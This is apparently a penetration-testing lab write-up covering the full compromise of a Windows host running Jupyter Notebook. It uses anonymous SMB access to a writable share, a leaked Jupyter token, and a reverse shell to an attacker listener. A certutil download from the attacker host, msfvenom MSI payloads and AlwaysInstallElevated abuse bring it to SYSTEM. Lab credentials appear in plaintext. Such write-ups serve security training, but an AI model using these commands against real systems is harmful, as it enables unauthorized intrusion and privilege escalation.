## INFORMATION GATHERING
```bash
# IP ADDRESS
10.10.140.75
# HOSTNAME //Found Post Initial Enumeration
DEV-DATASCI-JUP
# OPERATING SYSTEM //Found Post Initial Enumeration
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
# CREDENTIALS //Found Post Initial Enumeration
Username : dev-datasci-lowpriv
Password : wUqnKWqzha*W!PWrPRWi!M8faUn
```
## OPEN PORTS DETAILS
```bash
22/tcp    open  ssh           syn-ack ttl 125 OpenSSH for_Windows_7.7 (protocol 2.0)

135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC

139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125

3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services

5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

8888/tcp  open  http          syn-ack ttl 125 Tornado httpd 6.0.3

47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```
# ENUMERATION
## PORT 139 445
```bash
sudo crackmapexec smb $ip --shares -u 'anonymous' -p ''                                 
SMB         10.10.140.75    445    DEV-DATASCI-JUP  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DATASCI-JUP) (domain:DEV-DATASCI-JUP) (signing:False) (SMBv1:False)
SMB         10.10.140.75    445    DEV-DATASCI-JUP  [+] DEV-DATASCI-JUP\anonymous: 
SMB         10.10.140.75    445    DEV-DATASCI-JUP  [+] Enumerated shares
SMB         10.10.140.75    445    DEV-DATASCI-JUP  Share           Permissions     Remark
SMB         10.10.140.75    445    DEV-DATASCI-JUP  -----           -----------     ------
SMB         10.10.140.75    445    DEV-DATASCI-JUP  ADMIN$                          Remote Admin
SMB         10.10.140.75    445    DEV-DATASCI-JUP  C$                              Default share
SMB         10.10.140.75    445    DEV-DATASCI-JUP  datasci-team    READ,WRITE      
SMB         10.10.140.75    445    DEV-DATASCI-JUP  IPC$            READ            Remote IPC

- Found share datasci-team with READ,WRITE permission
- Found jupyter-token.txt
067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a
```
## PORT 8888
```bash
- Found Jupyter Notebook Login on http://10.10.140.75:8888/login?next=%2Ftree%3F
- Using the token "067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a" trying to login
- Worked !!!
```
## INITIAL FOOTHOLD
```bash
- Select New > Python3
- It open an python notebook
- Trying python reverse shells from https://www.revshells.com/
- Python3 Windows worked 

sudo nc -nvlp 80
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.10.140.75] 53367
id
uid=1000(dev-datasci) gid=1000(dev-datasci) groups=1000(dev-datasci),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
whoami
dev-datasci

- Upgraded the shell to python3 
python3 -c 'import pty; pty.spawn("/bin/bash")'  
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ 
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ 
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ ^Z
zsh: suspended  sudo nc -nvlp 80
$ stty raw -echo; fg
[1]  + continued  sudo nc -nvlp 80
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ export TERM=xterm-256color
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ stty rows 55 cols 238
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ 
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ alias ll='ls -lsaht --color=auto'
```
## PRIVILEGE ESCALATION
```bash
- Found dev-datasci-lowpriv_id_ed25519 ssh private key 
- Trying username dev-datasci-lowpriv
- copy the private key to a filw with permission 0600
sudo ssh -i ssh.key dev-datasci-lowpriv@$ip
dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>whoami
dev-datasci-jup\dev-datasci-lowpriv

# Privesc 
- Running PrivescCheck.ps1 
- source https://github.com/itm4n/PrivescCheck

dev-datasci-lowpriv@DEV-DATASCI-JUP C:\>powershell -ep bypass
Windows PowerShell                                                                            
Copyright (C) Microsoft Corporation. All rights reserved.                                     
PS C:\> cd  C:\Windows\Tasks                                                                  
PS C:\Windows\Tasks> certutil -f -urlcache http://10.13.80.25/PrivescCheck.ps1 ./PrivescCheck.ps1
****  Online  ****                                                                             
CertUtil: -URLCache command completed successfully.                                            
PS C:\Windows\Tasks> . .\PrivescCheck.ps1                                                     
PS C:\Windows\Tasks> Invoke-PrivescCheck       

- Findings
Domain   : DEV-DATASCI-JUP
Username : dev-datasci-lowpriv
Password : wUqnKWqzha*W!PWrPRWi!M8faUn

┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ AlwaysInstallElevated                             ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the 'AlwaysInstallElevated' policy is enabled  ┃
┃ system-wide and for the current user. If so, the current     ┃
┃ user may install a Windows Installer package with elevated   ┃
┃ (SYSTEM) privileges.                                         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
LocalMachineKey   : HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
LocalMachineValue : AlwaysInstallElevated
LocalMachineData  : 1
CurrentUserKey    : HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
CurrentUserValue  : AlwaysInstallElevated
CurrentUserData   : 1
Description       : AlwaysInstallElevated is enabled in both HKLM and HKCU.

# AlwaysInstallElevated
- Create a payload and Transfer
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.80.25 LPORT=8888 -f msi -o reverse.msi

- Start Listener on Port 8888
PS C:\Windows\Tasks> msiexec /quiet /qn /i C:\Windows\Tasks\reverse.msi
PS C:\Windows\Tasks> runas /user:dev-datasci-lowpriv “msiexec /i C:\Windows\Tasks\reverse.msi /qn”
Enter the password for dev-datasci-lowpriv: wUqnKWqzha*W!PWrPRWi!M8faUn

sudo rlwrap nc -nvlp 8888
[sudo] password for kali: 
listening on [any] 8888 ...
connect to [10.13.80.25] from (UNKNOWN) [10.10.140.75] 49841
Microsoft Windows [Version 10.0.17763.3287]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Wed Feb 26 15:06:42 2025 as: /usr/lib/nmap/nmap -p 22,135,139,445,3389,5985,8888,47001,49664,49665,49667,49668,49669,49670,49671 -sC -sV -vv -oN nmap/scan-script-version 10.10.140.75
Nmap scan report for 10.10.140.75
Host is up, received reset ttl 125 (0.35s latency).
Scanned at 2025-02-26 15:06:45 IST for 74s

PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 125 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBae1NsdsMcZJNQQ2wjF2sxXK2ZF3c7qqW3TN/q91pWiDee3nghS1J1FZrUXaEj0wnAAAbYRg5vbRZRP9oEagBwfWG3QJ9AO6s5UC+iTjX+YKH6phKNmsY5N/LKY4+2EDcwa5R4uznAC/2Cy5EG6s7izvABLcRh3h/w4rVHduiwrueAZF9UjzlHBOxHDOPPVtg+0dniGhcXRuEU5FYRA8/IPL8P97djscu23btk/hH3iqdQWlC9b0CnOkD8kuyDybq9nFaebAxDW4XFj7KjCRuuu0dyn5Sr62FwRXO4wu08ePUEmJF1Gl3/fdYe3vj+iE2yewOFAhzbmFWEWtztjJb
|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOGl51l9Z4Mg4hFDcQz8v6XRlABMyVPWlkEXrJIg53piZhZ9WKYn0Gi4fKkzo3blDAsdqpGFQ11wwocBCSJGjQU=
|   256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHw9uTZkIMEgcZPW9Z28Mm+FX66+hkxk+8rOu7oI6J9
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Issuer: commonName=DEV-DATASCI-JUP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-02-25T09:26:42
| Not valid after:  2025-08-27T09:26:42
| MD5:   2e46:d876:9ae3:cc37:b0dd:2b6e:0246:e1c4
| SHA-1: f319:cbbb:26b0:9646:0e5e:4b63:6ecc:1eec:0e43:b49e
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQXbEQ3/BWzIlDgyD1EMx5HjANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9ERVYtREFUQVNDSS1KVVAwHhcNMjUwMjI1MDkyNjQyWhcNMjUw
| ODI3MDkyNjQyWjAaMRgwFgYDVQQDEw9ERVYtREFUQVNDSS1KVVAwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDN1YTM5aO69DE//1C/c3RuW/Gg6tLCISY6
| xPEWVtlUHaTu05yAbamYzw3dl/EaiiQIY5O8Py+R0NkZziZk8NdC3voOSR5z0tOk
| U26S4K1yoDZOoxSLa28H3zU0FzlZIVO8rG5G61n1OUGOw5xQaTjLlvecmFLFsDRl
| hiTvlUHBWePEvKVujbaiVZX2Z4p+uDyKsJEOkohiRbv4vvZBKL5jQ51umK+QmguJ
| ZqkE68D6m8xcFQX52r8GbtQqz7NfaV2ROdsBVLVgkL2mpecQpa31j9DA6ThbOWG8
| GsdMs3UnBDGg5GdKtyS0Jd8KY58qg+n3xBTFye4cZw8K0mVHgqqJAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEABL09zSws9ABG11kQH4JbbYns9s9FkcR2pmxJm/Fh3/qILgiaqAOJsRMn
| i/KLsy/sV447aAnqREdUm3/5uG8nGsbnnSjqfmOC1MtJG9K5N6PpKaeUIVnsaSYN
| X8CT7+mezSzlkmIth+Ljd4ih+7gPcuFV2x1rN6nAEYrYPHpdqQ3vdRP18rRH5QAz
| XRppXEL/+U6ArldE6sLH5c+wKeru04ULMoMAw553GPdgckli09lFENnqoj8yijzI
| A4Dho6gvlxw+Y5O6KQyJ1G7rbtB+8aehdzLSVBJ1F3sM7dy6TANsx25200+P+xfk
| ZXEZCmFDNS3SoALft2GEMcyCw7d69Q==
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2025-02-26T09:37:46+00:00
|_ssl-date: 2025-02-26T09:37:57+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8888/tcp  open  http          syn-ack ttl 125 Tornado httpd 6.0.3
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
|_http-server-header: TornadoServer/6.0.3
| http-robots.txt: 1 disallowed entry 
|_/ 
| http-methods: 
|_  Supported Methods: GET POST
|_http-favicon: Unknown favicon MD5: 97C6417ED01BDC0AE3EF32AE4894FD03
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-02-26T09:37:50
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 22452/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 48795/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 39004/udp): CLEAN (Failed to receive data)
|   Check 4 (port 49319/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: -1s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 26 15:07:59 2025 -- 1 IP address (1 host up) scanned in 76.69 seconds

```

